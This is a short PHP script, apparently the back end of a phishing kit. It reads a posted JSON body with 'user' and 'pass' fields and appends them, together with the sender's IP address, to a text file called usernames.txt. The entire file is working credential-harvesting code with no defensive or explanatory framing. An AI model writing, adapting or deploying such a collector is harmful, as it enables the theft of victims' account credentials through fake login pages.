<?php
if (!empty($_SERVER['HTTP_CLIENT_IP']))
{
  $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
}
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
{
  $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
}
else
{
  $ipaddress = $_SERVER['REMOTE_ADDR'];
}

$data = json_decode( file_get_contents( 'php://input' ), true);
file_put_contents("usernames.txt", 
"IP: $ipaddress
Username: {$data['user']} 
Pass: {$data['pass']} 
——————————————————————————————————"
, FILE_APPEND);
exit();
?>